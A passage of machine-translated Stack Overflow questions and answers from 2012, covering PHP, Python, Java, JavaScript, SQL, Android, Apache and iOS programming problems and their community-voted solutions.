//                                |
//                                +--- Remove this guy. 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:41:26.317

因为你错过了一个）

```
document.location.href="http://example.com/tracer?="+(getSearchVariable('Track')+"&tba=N"
                                                     ^1                ^2      ^2 
```

它应该是

```
document.location.href="http://example.com/tracer?="+(getSearchVariable('Track'))+"&tba=N" 
```

# php - 创建动态 PHP 数组

> ID：13280738
> 
> 赞同：1
> 
> 时间：2012-11-08T00:40:06.287
> 
> 标签：php, arrays

我是新的 PHP 问题，我正在尝试从我拥有的以下数据字符串创建一个数组。我还没有得到任何工作。有没有人有什么建议？

我的字符串：

```
Acct_Status=active,signup_date=2010-12-27,acct_type=GOLD,profile_range=31-35 
```

我想动态创建一个名为“My_Data”的数组并让 id 显示类似于我的以下内容，请记住我的数组可能会在不同时间返回或多或少的数据。

```
My_Data
(
    [Acct_Status] => active
    [signup_date] => 2010-12-27
    [acct_type] => GOLD
    [profile_range] => 31-35
) 
```

第一次使用 PHP，有人对我需要做什么或有一个简单的解决方案有任何建议吗？我试过使用爆炸，为每个循环做一个，但要么我在我需要做的路上走得很远，要么我错过了一些东西。我得到了更多符合以下结果的内容。

```
Array ( [0] => Acct_Status=active [1] => signup_date=2010-12-27 [2] => acct_type=GOLD [3] => profile_range=31-35} ) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T00:44:45.180

您需要`explode()`打开字符串`,`，然后在`foreach`循环中，`explode()`再次打开`=`并将每个字符串分配给输出数组。

```
$string = "Acct_Status=active,signup_date=2010-12-27,acct_type=GOLD,profile_range=31-35";
// Array to hold the final product
$output = array();
// Split the key/value pairs on the commas
$outer = explode(",", $string);
  // Loop over them
foreach ($outer as $inner) {
  // And split each of the key/value on the =
  // I'm partial to doing multi-assignment with list() in situations like this
  // but you could also assign this to an array and access as $arr[0], $arr[1]
  // for the key/value respectively.
  list($key, $value) = explode("=", $inner);
  // Then assign it to the $output by $key
  $output[$key] = $value;
}

var_dump($output);
array(4) {
  ["Acct_Status"]=>
  string(6) "active"
  ["signup_date"]=>
  string(10) "2010-12-27"
  ["acct_type"]=>
  string(4) "GOLD"
  ["profile_range"]=>
  string(5) "31-35"
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T00:45:42.387

[`parse_str`](http://php.net/parse_str)转换`,`为`&`using后，将使用惰性选项[`strtr`](http://php.net/strtr)：

```
$str = strtr($str, ",", "&");
parse_str($str, $array); 
```

但是，我会在这里完全使用正则表达式来更多地断言结构：

```
preg_match_all("/(\w+)=([\w-]+)/", $str, $matches);
$array = array_combine($matches[1], $matches[2]); 
```

这将跳过任何不是由字母、数字或连字符组成的属性。（当然，问题是这是否是您输入的可行约束。）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-08T00:45:13.773

```
$myString = 'Acct_Status=active,signup_date=2010-12-27,acct_type=GOLD,profile_range=31-35';
parse_str(str_replace(',', '&', $myString), $myArray);
var_dump($myArray); 
```

# python - 在 Python 中， time.time() * 1000 是否足够精确？

> ID：13280743
> 
> 赞同：3
> 
> 时间：2012-11-08T00:40:33.590
> 
> 标签：python, time, precision

我想在 python 中以亚秒精度捕获时间戳。看起来标准答案是`int(time.time() * 1000)`

但是，如果`time.time()`返回一个浮点数，你不会有精度问题吗？会有一些值不能准确地表示为浮点数。

我担心一些不能正确表示为浮点数的小数时间，以及在这些情况下时间戳向前或向后跳跃。

这是一个有效的担忧吗？

如果是这样，解决方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:53:02.393

你想要多少精度？虽然确实存在不能表示为有限二进制分数的有限十进制分数，但只要您不为运行 143 千年的程序计时，最接近的近似值就会四舍五入到正确的整数毫秒数（ 2**52 毫秒）。

简而言之：我认为您无需为此担心浮点精度。不过，您可能需要担心系统计时器的准确性、精度或单调性。

# java - 什么是 JMS 中的重复持久订阅

> ID：13280754
> 
> 赞同：0
> 
> 时间：2012-11-08T00:41:51.330
> 
> 标签：java, jakarta-ee, jms, messaging

我很难理解持久订阅。我知道，当侦听器将自己注册为主题的持久订阅者时，它会告诉 JMS -“嘿，我是持久订阅者，从现在开始，如果我不在那里，您需要将所有消息存储在主题中并将这些消息传递给我当我回来时”

现在，如果是这样，为什么两个订阅者不能请求这个持久订阅？

我错过了什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T01:00:00.177

Quoting from the [Java EE tutorial](http://docs.oracle.com/javaee/6/tutorial/doc/bncfu.html#bncgd)

> A durable subscriber registers a durable subscription by specifying a unique identity that is retained by the JMS provider. Subsequent subscriber objects that have the same identity resume the subscription in the state in which it was left by the preceding subscriber. If a durable subscription has no active subscriber, the JMS provider retains the subscription’s messages until they are received by the subscription or until they expire.

To make durable subscriptions work for multiple subscribers on 1 durable subscription the broker would have to store each individual message from the creation of the topic (by the first-ever subscriber) until its expiry, ie potentially forever if no message TTL is specified, because at any point in time a new subscriber can pop in and claim all the messages it "missed" (that is, all messages since the subscription was created). That's just not feasible.

I may be missing the point here, but I can't see how having multiple simultaneous subscribers sharing a subscription would be more practical than defining two separate subscriptions?

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-02T18:42:32.170

对 Duplicate Durable Subscription 的理解是不正确的。

持久订阅并不意味着没有多个订阅者可以订阅。这意味着没有一个订阅者可以有两个不同的持久标识符。

# javascript - 为 Fullcalendar 的 eventSources 指定数据

> ID：13280759
> 
> 赞同：0
> 
> 时间：2012-11-08T00:42:44.067
> 
> 标签：javascript, ajax, jquery, fullcalendar

我正在使用 jQuery Fullcalendar 插件。在同一页面上，我有一个带有复选框的表单，用于过滤从服务器获取的事件数据。这个想法是我想将这些表单值传递给`eventSources`对象，以便它们与开始/结束时间戳一起传输到服务器。

[文档](http://arshaw.com/fullcalendar/docs/event_data/events_json_feed/)有一个`eventSources`这样的示例对象：

```
$('#calendar').fullCalendar({
   eventSources: [
     // your event source
      {
        url: '/myfeed',
        type: 'POST',
        data: {
          custom_param1: 'something',
          custom_param2: 'somethingelse'
        },
      }
      // other sources...
   ]
}); 
```

我修改为：

```
 eventSources: [
   {
     // ...as above
     data: getFormAsObject(),
     // as above...
   } 
```

我希望将表单的值传递给`data`对象。在`getFormAsObject()`函数中，我将表单序列化并将其转换为关联数组。

剩下的就是劫持表单提交。因此，如果单击“提交”按钮，我会取消默认的 POST 操作，并调用

```
calendar.fullCalendar("refetchEvents"); 
```

但是，这不起作用，并且`getFormAsObject()`根本没有被调用。*我究竟做错了什么？*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T11:28:41.397

问题是（似乎）Fullcalendar 只读取该`data`对象一次。所以它第一次读取它然后不再读取它，即使我将它设置为一个函数。我不确定，但我认为这可能是底层`ajax()`调用的工作方式？

因此，我将其更改为删除`eventSources`，然后在每次更新时读取新的。看起来很难看，但有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-11-06T10:55:45.177

在此处使用“动态数据参数”倒数第二个选项： [https ://fullcalendar.io/docs/events-json-feed](https://fullcalendar.io/docs/events-json-feed)

```
$('#calendar').fullCalendar({

  events: {
    url: '/myfeed.php',
    data: function() { // a function that returns an object
      return {
        dynamic_value: Math.random()
      };
    }
  }

}); 
```

# linux - 使用 bash 将带有空格的字符串作为 git commit 消息发送

> ID：13280762
> 
> 赞同：4
> 
> 时间：2012-11-08T00:42:58.810
> 
> 标签：linux, string, git, bash, whitespace

我正在创建一个更新 git 分支的 bash 脚本，一切正常，但现在我想添加将提交消息指定为参数的选项。

我首先使用了这个命令：

```
echo "Executing git commit..."
git commit -m "$1" 
```

但是当我发送这样的东西时：

```
$ git.sh "testing commit message" 
```

我收到一堆错误，告诉我命令无法被 git 识别。

我想在这种情况下，我添加的双引号不是将参数作为单个字符串传递，而是将参数作为多个传递，因此 -m 选项仅采用第一个，而 git 尝试将其他双引号作为提交选项传递。

从脚本参数中获取多字字符串作为 git commit 消息时，有没有更好的方法？

我非常感谢您的任何建议。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T05:45:37.247

当 shell 评估命令时，引号将被删除。

使用类似的东西

```
git commit -m "'$1'" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-03-09T12:54:55.277

这对我有用：

```
git commit -m "$(echo $@)" 
```

# android - android.app.Application 调用 ArrayAdapter.notifyDataSetChanged

> ID：13280764
> 
> 赞同：0
> 
> 时间：2012-11-08T00:43:09.647
> 
> 标签：android

我有一个静态类，它扩展了 android.app.Application ( **HireApplication** )，它正在做很多我的后台工作。我在这里创建 AsyncTasks，我存储了我的应用程序使用的最大数据对象。我在 Application 类中编写此代码，以便我可以在电话和平板电脑的单独活动之间重用它。

这感觉像是布局我的应用程序的正确方法，但现在我遇到了问题。AsyncTask 已完成，需要在 Fragment ( **ListFragment** ) 内的 ArrayAdapter 上运行 notifyDataSetChanged。

这是我的解决方案：

**列表片段：**

```
public void onCreate (Bundle savedInstanceState) {
    super.onCreate(savedInstanceState); 
    myListAdapter = new MyListAdapter(getActivity(), HireApplication.myList);
    HireApplication.myListAdapter = myListAdapter; // Tell the application where the ListView is so that it can notifyDataSetChanged
} 
```

**招聘申请：**

```
public static ArrayAdapter<BikeStation> stationListAdapter = null;

private static void asyncTaskCompleteCallback() {
    {...}
    myListAdapter.notifyDataSetChanged();
} 
```

现在，这行得通……但感觉不对。我正在向应用程序提供对 UI 元素的引用，这听起来有点紧密耦合，但我不知道有更好的方法来做到这一点。

有没有更好的方法让我的应用程序通知我的 ArrayAdapter 或 Fragment 它应该采取一些措施来使用新数据更新 UI？

干杯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:47:25.623

整个事情在我看来是错误的......如果您使用的是片段和适配器，您应该使用 LoadManager 而不是 AsyncTasks。此外，将所有内容都放在您的应用程序上似乎是您想要解决的问题的糟糕解决方案；这将导致可能的内存泄漏并且感觉不对。

# oauth - 使用 OAuth 的 Vkontakte API 不适用于验证码

> ID：13280765
> 
> 赞同：36
> 
> 时间：2012-11-08T00:43:09.307
> 
> 标签：oauth, captcha, vk

Vkontakte API 拒绝带有验证码的请求。[这](https://api.vk.com/method/friends.add?uid=UID&access_token=ACCESS_TOKEN)是我所做的示例。

在第三个请求之后，我得到：

> 验证码错误 (14) - 需要验证码。

根据[文档](https://api.vk.com/method/friends.add?uid=UID&access_token=ACCESS_TOKEN&captcha_sid=CSID&captcha_key=CKEY)，将参数添加到原始请求并重复请求`captcha_sid`就足够了。`captcha_key`

但反应依旧`Captcha error (14)`。是否可以在 Vkontakte API 中使用验证码和 OAuth？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-05-10T11:43:03.767

验证码错误

> 错误代码：14
> 
> 错误文本：需要验证码

并且在以下情况下需要验证码确认：

> 操作（例如发送消息）**执行过于频繁**，API 请求可能会返回“*需要验证码*”错误。之后，用户需要输入图像中的代码并在请求参数中输入验证码重新发送请求。

更多信息可以[在他们的手册中找到。](https://vk.com/dev/captcha_error)

如果遇到此错误，您需要从带有错误消息的响应中额外处理以下参数：

1.  `captcha_sid`– 验证码标识符；
2.  `captcha_img`– 指向将显示给用户的图像的链接。

当用户输入文本时，`captcha_img`您必须重新发送请求，添加以下参数：

1.  `captcha_sid`– 收到的 ID；
2.  `captcha_key`- 您从用户那里获得的文本输入。

不要忘记提供有效的访问令牌，以使用户授权，否则请求将因其他类型的错误而被拒绝。

# mysql - 简单日期查询中的 MySQL phpMyAdmin 错误

> ID：13280766
> 
> 赞同：1
> 
> 时间：2012-11-08T00:43:29.597
> 
> 标签：mysql, phpmyadmin

在使用 phpMyAdmin 的 MySQL 中，我尝试使用这个简单的查询来获取满足特定日期条件的行：

```
select * 
from student_invoice
where date_generated < '2012-01-01' 
```

date_generated 是日期类型。我在 phpMyAdmin 中收到一条错误消息：

```
ERROR: Unclosed quote @ 64 STR: ' 
```

我已经关闭了所有报价，所以它没有意义。phpMyAdmin 版本是 2.11.9.6

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:13:22.447

添加一个新答案，因为它与我的另一个无关。

根据[这里的这个 bugzilla 帖子](https://bugzilla.redhat.com/show_bug.cgi?id=725123)，您的版本存在这个错误！

升级到 2.11.11 或更高版本应该可以解决此问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:53:11.550

这可能听起来很傻，但是您是否尝试过将日期用双引号括起来？

```
SELECT * 
FROM sometable
WHERE somedatecolumn < "2012-01-01" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T00:45:54.783

确保这些实际上是围绕日期的单引号，而不是反引号。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T00:46:29.320

不熟悉具体的错误。但是您可以尝试将静态日期转换为日期格式，以确保它与 datecolumn 格式相匹配。或者甚至同时铸造两者？IE：

```
 where cast(somedatecolumn as DATE) < cast('2012-01-01' as DATE) 
```

不过我有种行不通的感觉。所以也许这个？：

```
 where somedatecolumn < cast('2012-01-01' as DATE) 
```

# sql - postgreSQL 连接给出错误

> ID：13280769
> 
> 赞同：0
> 
> 时间：2012-11-08T00:44:04.480
> 
> 标签：sql, postgresql, cpanel

这个加入是

```
SELECT 
s.id,
s.sector_abbr,
s.sector_desc,
l.id,
l.sector_id,
l.vendor_address_id
FROM sectors s
LEFT JOIN sector_vendor_address_link l
ON s.id = l.sector_id 
```

给我这个错误

`ERROR: ERROR: permission denied for relation sector_vendor_address_link`

通过 razorSQL 使用这个 id 和密码，我能够对这些相同的表进行更新，所以我无法想象这是一个权限问题。也许我错了。我的加入只是格式错误吗？

谢谢！

编辑：

看来我必须为每个表手动设置所有权限。有没有办法使用 phpPgAdmin 全局设置整个数据库的用户权限？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:17:27.390

是的，您可以使用[`ALTER DEFAULT PRIVILEGES`](http://www.postgresql.org/docs/current/interactive/sql-alterdefaultprivileges.html).

对于现有表，您必须使用它[`GRANT`](http://www.postgresql.org/docs/current/interactive/sql-grant.html)来分配所需的权限。该`ALL TABLES`子句对这项工作很有用。

# c++ - 这是对 std::array 未定义行为的使用吗？

> ID：13280771
> 
> 赞同：8
> 
> 时间：2012-11-08T00:44:22.707
> 
> 标签：c++, c++11, undefined-behavior

> **可能重复：**
> [允许将 `T*` 与 `char*` 混淆。是否也允许反过来？](https://stackoverflow.com/questions/12612488/aliasing-t-with-char-is-allowed-is-it-also-allowed-the-other-way-around)

我使用 a `std::array`of `char`s 来保存未知原始类型的值，其长度不超过 10 个字节，如下所示：

```
std::array<char, 10> val;
*reinterpret_cast<double*>(val.data()) = 6.3;
//blah blah blah...
double stuff = *reinterpret_cast<double*>(val.data()); 
```

我已经读过来回转换`char *`不是未定义的，因为编译器假定 a`char *`可以为任何类型的值取别名。当值被放置在（我假设是）`char`对象内的 s 数组中时，这仍然有效吗？

注意：我知道我可以在这里使用联合，但这会导致我正在做的事情有大量的样板代码，如果有必要我想避免它，因此这个问题。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-08T00:49:19.357

是`std::array< char, 10 >`的，不满足对齐要求，`double`所以`reinterpret_cast`会招致UB。

试试[`std::aligned_storage`](http://en.cppreference.com/w/cpp/types/aligned_storage)吧。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:52:34.577

数组包含在什么中并不重要。

该标准甚至不考虑围绕某事物的内容（这是基本的），但确实支持与`char`序列的转换。

要通过`reinterpret_cast`和赋值直接执行此操作，您需要正确对齐缓冲区。

另一种方法是使用`memcpy`，它不关心对齐。

在一个相关问题上，降低到二进制级别通常不是一个好主意。例如，编译器的简单版本更改可能会使二进制序列化数据文件无法访问。无论如何，这样做的主要驱动因素是原始性能考虑。

# android - Android远程服务正在执行但onStartCommand从未调用

> ID：13280773
> 
> 赞同：1
> 
> 时间：2012-11-08T00:44:56.803
> 
> 标签：android, service, aidl

因此，经过 2-3 小时的失败后，我终于让我的远程服务以某种方式工作，但它的表现真的很奇怪。

我正在使用 AIDL 将 mediaPath 字符串发送到我的服务，它开始播放音乐就好了，但是 onStartCommand 永远不会被调用，并且应用程序中的服务条目没有我在清单文件中设置的标签/描述。[http://i50.tinypic.com/344p349.png]

如果我终止主 Activity 进程，服务也会终止，尽管它位于一个单独的进程中。这是应该的吗？[http://i49.tinypic.com/16hpa86.png]

而且我从来没有得到“服务断开连接”日志，这应该在服务与活动解除绑定时发生。

服务代码：

```
package com.example.randomserviceshitnot;

import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.media.MediaPlayer;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

public class MojPrviServis extends Service {
    private final Servis.Stub binder = new Servis.Stub() {
        public void execute(String mediaPath) throws RemoteException {
            MediaPlayer mp = new MediaPlayer();

            try {
                mp.setDataSource(mediaPath);
                mp.prepare();
            } catch (IllegalArgumentException e) { e.printStackTrace(); } catch (SecurityException e) {
                e.printStackTrace(); } catch (IllegalStateException e) { e.printStackTrace();
            } catch (IOException e) { e.printStackTrace(); }
                mp.start();
        }
    };

    public void onCreate() {
        super.onCreate();
        Log.d("Filip", "Service onCreate called.");
    }

    public IBinder onBind(Intent intent) {
        return binder;
    }

    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("Filip ", "Service onStart called.");
        return START_STICKY;
    }
} 
```

活动代码：

```
package com.example.randomserviceshitnot;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

public class MainActivity extends Activity {
    private Servis mBoundService;
    private boolean mIsBound = false;
    private static final String mediaPath = Environment.getExternalStorageDirectory().toString()+"/Music/Art Of The Dress(Archie Remix).mp3";

    private ServiceConnection mConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d("Filip ", "Service connected."); 
            mBoundService = Servis.Stub.asInterface(service);
            try {
                mBoundService.execute(mediaPath);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }

        public void onServiceDisconnected(ComponentName name) {
            Log.d("Filip ", "Service disconnected.");
            mBoundService = null;
        }
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onStart() {
        super.onStart();
        doBindService();
    }

    void doBindService() {
        Intent s = new Intent();
        s.setAction("remote.servis");
        bindService(s, mConnection, Context.BIND_AUTO_CREATE);
        mIsBound = true;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        doUnbindService();
    }

    public void onPause() {
        super.onPause();
        doUnbindService();
    }

    void doUnbindService() {
        if(mIsBound) {
            unbindService(mConnection);
            mIsBound=false;
        }
    }
} 
```

爱迪尔：

```
package com.example.randomserviceshitnot;

interface Servis {
    void execute(String s);
} 
```

显现：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.randomserviceshitnot"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="15" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name=".MainActivity"
            android:label="@string/title_activity_main" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service android:name=".MojPrviServis"
            android:label="@string/servis_koji_notifikuje"
            android:description="@string/proces_desc"
            android:icon="@drawable/ic_launcher"
            android:process=":dep" >
            <intent-filter>
                <action android:name="remote.servis" />
            </intent-filter>
        </service>
    </application>
</manifest> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-18T14:13:31.907

[http://developer.android.com/guide/components/services.html](http://developer.android.com/guide/components/services.html)

阅读 onStartCommand() 和 onBind() 的文档

当您调用 bindService() 时，不会调用 onStartCommand()。但是 onBind() 被调用。

如果使用 bindservice() 启动服务，如果所有客户端都退出，则服务也会终止。

要播放音乐，您应该使用 startService() 而不是 bind。如果以这种方式启动服务，那么当客户端存在时它不会停止。完成后它必须自行停止。

# webserver - 如何解决节点错误“Httpd Failed”？

> ID：13280774
> 
> 赞同：0
> 
> 时间：2012-11-08T00:45:05.507
> 
> 标签：webserver, apache

过去，当我修改 node.js 并尝试在我们的服务器上设置它时，我对我们的站点 httpd.conf 文件和可能的其他一些东西进行了一些更改。

我们的服务器时不时地崩溃，我无法找出问题所在，但我只是意识到它可能是由我在修补 node.js 时所做的事情引起的。

这是我们的问题的屏幕截图：

![在此处输入图像描述](../Images/1451774dbc06ed92ba9b80843ade172b.png)

任何想法为什么会发生这种情况？我尝试使用 /scripts/rebuildhttpdconf 修复程序重置 Apache 目录中的 httpd.conf 文件，但它似乎没有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T02:02:13.743

在与@Sneaksta 聊天并在 error_log 中挖掘后，我们发现了以下错误消息：

```
[Thu Nov 08 12:22:24 2012] [emerg] (43)Identifier removed: couldn't grab the accept mutex 
```

根据[michaelwlucas.com](http://blather.michaelwlucas.com/archives/678)上的一篇博客文章，这看起来像是 apache 的内部互斥锁的问题。将以下行添加到您的 apache 配置中应该可以解决此问题（只需使用内存互斥体而不是锁定文件）：

```
AcceptMutex posixsem 
```

# sql-server - 无法使用 db 链接创建对象；ORA - 0251: 同一事务中的另一个会话或分支失败或已完成

> ID：13280777
> 
> 赞同：3
> 
> 时间：2012-11-08T00:45:13.293
> 
> 标签：sql-server, oracle, database-link, heterogeneous-services

我在 Oracle 11.2.0.3 和 SQL Server 2008 之间有一个异构链接。当我尝试创建视图或引用系统表的异构服务视图的过程时，我收到下面列出的 4 个错误：

ORA-00604: 递归 SQL 级别 1 发生错误

ORA-02051: 同一事务中的另一个会话或分支失败或已完成

ORA-06512：在“SYS.HS$_DDTF_SQLTABLES”，第 58 行

ORA-06512: 在第 1 行

例如，当我尝试执行以下代码时会创建这些错误：

```
CREATE VIEW ALLMYTABLES AS
SELECT * FROM ALL_TABLES@DBLINKNAME; 
```

但是，我可以在任何普通表上创建视图：

```
CREATE VIEW RANDOMTABLE AS
SELECT * FROM RANDOMTABLE@DBLINKNAME; 
```

我已经对与此类似的问题进行了一些研究，但没有找到与此特定问题相关的任何参考资料。我相信这可能与创建视图的并发操作和对SQL Server数据库的select *语句调用之间的冲突有关。或者可能是在创建视图时没有完全获取记录。

我不知道 HS 链接配置和属性的细节。

# objective-c - 如何检查 NSData 是否有多媒体内容？

> ID：13280781
> 
> 赞同：0
> 
> 时间：2012-11-08T00:45:30.747
> 
> 标签：objective-c, cocoa, video, nsdata, nsurl

我有一个从 URL 请求获得的 NSData 对象。现在我不知道如何阅读它。
但是在我的应用程序中，我不知道数据是否包含视频，所以我会知道：

1.  如何知道 NSData 里面是否有视频？
2.  如何解释数据，逐字节读取？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:47:55.270

我不熟悉您使用的特定 API，所以我不能说代码应该是什么，但是*任何*Web/HTTP 客户端库都应该为您提供`Content-Type`数据以及数据本身。使用 Content-Type（并且*仅*使用 Content-Type；否则会导致安全漏洞）来确定如何解释内容。例如，如果 Content-Type（也称为 MIME 类型）以 开头`video/`，则内容肯定是视频；斜线后面的部分将告诉您将其解释为的具体格式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T04:53:18.963

如果您打算播放数据可能包含的视频，那么就这样做。如果数据不是它识别的任何内容，您使用的任何回放 API 都应该给您一个错误。

# javascript - jqModal 不工作

> ID：13280797
> 
> 赞同：1
> 
> 时间：2012-11-08T00:47:10.383
> 
> 标签：javascript, html, jqmodal

我试图从[http://dev.iceburg.net/jquery/jqModal/](http://dev.iceburg.net/jquery/jqModal/)测试一些工作代码， 以了解它是如何工作的，但我无法让代码工作。我正在尝试使用弹出对话框部分，并且我正在测试示例部分中的默认代码，这是第一个示例。这是我复制并尝试测试的内容。不工作的部分是弹出的对话框。我收到一个错误说.... Uncaught ReferenceError: $ is not defined

```
<html>

<head>
<title> test </title>

<style type = "text/css">

.jqmWindow {
display:none;

position: fixed;
top: 17%;
left: 50%;

margin-left: -300px;
width: 600px;

background-color: #EEE;
color: #333;
border: 1px solid black;
padding: 12px;
}

.jqmOverlay { background-color: #000; }

# html .jqmWindow {
 position: absolute;
 top: expression((document.documentElement.scrollTop || document.body.scrollTop) +     Math.round(17 * (document.documentElement.offsetHeight || document.body.clientHeight) / 100) + 'px');
}

</style>

<script type = "text/javascript">
$().ready(function() {
$('#dialog').jqm();
});

</script>
</head>

<body>

<a href="#" class="jqModal">view</a>
...
<div class="jqmWindow" id="dialog">

<a href="#" class="jqmClose">Close</a>
<hr>
<em>READ ME</em> -->
This is a "vanilla plain" jqModal window. Behavior and appeareance extend far beyond   this.
The demonstrations on this page will show off a few possibilites. I recommend walking
through each one to get an understanding of jqModal <em>before</em> using it.

<br /><br />
You can view the sourcecode of examples by clicking the Javascript, CSS, and HTML tabs.
Be sure to checkout the <a href="README">documentation</a> too!

<br /><br />
<em>NOTE</em>; You can close windows by clicking the tinted background known as the  "overlay".
Clicking the overlay will have no effect if the "modal" parameter is passed, or if the
overlay is disabled.
</div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T09:59:57.253

如果您的代码确实是您的整个 HTML，那么 $ 未定义的原因是您没有包含 jQuery（它定义了 $ 并将其用作简写）。您的代码既不包括 jQuery 库也不包括 jqModal 脚本。（诚​​然，jqModal 网站上的所有示例都是摘录而不是完整代码，因此他们认为这一步是理所当然的。）

添加

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script type="text/javascript" src="/assets/js/jqModal.js"></script> 
```

在您的 中`<head>`，根据需要调整 jQModal.js 的路径。

# javascript - 为什么表格单元格的 Javascript 宽度太短了一个像素？

> ID：13280798
> 
> 赞同：14
> 
> 时间：2012-11-08T00:47:11.260
> 
> 标签：javascript, jquery, firefox, google-chrome, css

当您申请`border-collapse: collapse;`表格以将其单元格的边框“融合”在一起时，它开始在确定 Javascript 中表格单元格的宽度时出现问题。例如，看这个页面：
[http](http://game-point.net/misc/browserTests/scratchpads/jsTableWidth/)
://game-point.net/misc/browserTests/scratchpads/jsTableWidth/ 有两张表格，一张有折叠边框，一张没有。如果单击没有折叠边框的行中的一行，jQuery 的 innerWidth 和 outerWidth 函数会报告我期望看到的内容（内容宽度和内容加上边框宽度；没有填充）。

但是，如果您单击表格中具有折叠边框的行，则会出现与浏览器不一致的行为，尤其是在`clientWidth`属性上。在 Firefox`clientWidth`中，与`width()`. 在 IE 和 Chrome 中高 1 个像素，在 Opera 中与 相同`width()`，但 Opera`width()`太小了。事实上，在`width()`我测试过的所有浏览器中，除了 Firefox 之外，它都太小了一个像素。所以如果你截屏并且内容实际上是 80px，`width()`就是 79px（jQuery 从计算的 CSS 值中得到它）。为什么是这样？

我想获得实际内容的宽度。我似乎无法使用`width()`，因为只有 Firefox 才能使用折叠边框。我不能使用`outerWidth()`，因为它包括边框（或者可能只是一个边框，因为它只比实际内容宽度大 1px）。我不能使用`clientWidth`，因为它的值在浏览器之间不一致。我应该怎么做，为什么`width()`在大多数浏览器中边框折叠时 1px 太短？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T07:54:13.517

在折叠边界模型中，单元格不仅仅是“融合”的，它们还被相邻的单元格*共享*。

所以说你有这样的标记：

```
<table style="border-collapse: collapse">
  <tr>
    <td style="border: 1px solid black; width: 100px">
    <td style="border: 1px solid black; width: 100px">
  </tr>
</table> 
```

在折叠边框模型中，该表格的宽度为 102px。实际上在表格*之外*有 0.5px 的边框，然后是 0.5px 的边框，然后是 100px 的单元格，然后是 1px 的边框，然后是 100px 的单元格，然后是 0.5px 的边框，然后是表格外的 0.5px 的边框。[请参阅http://www.w3.org/TR/CSS21/tables.html#collapsing-borders](http://www.w3.org/TR/CSS21/tables.html#collapsing-borders)上的图片

鉴于此，UA 应该为第一个单元格的各种宽度返回什么？应该是100px吗？101像素？102 像素？还有什么？简单地返回内容宽度加上边框宽度将返回 102px，但单元格实际占用的空间只有 101px...

此外，如果 jQuery 自己计算内容宽度，它也可能会遇到这个问题，如果它不以某种方式处理特殊情况的边框折叠单元格。

当然，对于 clientWidth 并没有真正的规范，更不用说 jQuery 的 width() 等了。这可以解释为什么你看到的结果到处都是。

*至于你应该做什么，如果你真的知道你的边框到底发生了什么，你可能应该 getBoundingClientRect().width （假设*浏览器不会搞砸）并减去边框的半宽度。如果您需要它来处理各种不同的边框宽度，我不确定是否有很好的解决方案。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-09T08:27:03.660

I think the problem in every browser but Opera is actually something jQuery is doing with its `width()` function; it has custom hooks for width and height and it doesn't always return the true computed width. When I use `window.getComputedStyle` to get the widths of these table cells, it does indeed give me the proper rendered width. I am going to report Opera's `window.getComputedStyle` output as a bug, because it doesn't seem to give you the proper rendered width even when you bypass jQuery.

# iphone - Iphone启动图像消失得非常快

> ID：13280802
> 
> 赞同：4
> 
> 时间：2012-11-08T00:47:21.627
> 
> 标签：iphone, ios, image, launch

启动图像在 iPhone 中出现和消失的速度非常快。我该如何控制这个时间？默认是多少秒？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T03:51:39.270

您可以使用`sleep(time in seconds)`中的函数 `application:didFinishLaunchingWithOptions:`来显式地自行增加一些时间。

例如：

```
sleep(3); 
```

将时间延长到 3 秒以上。

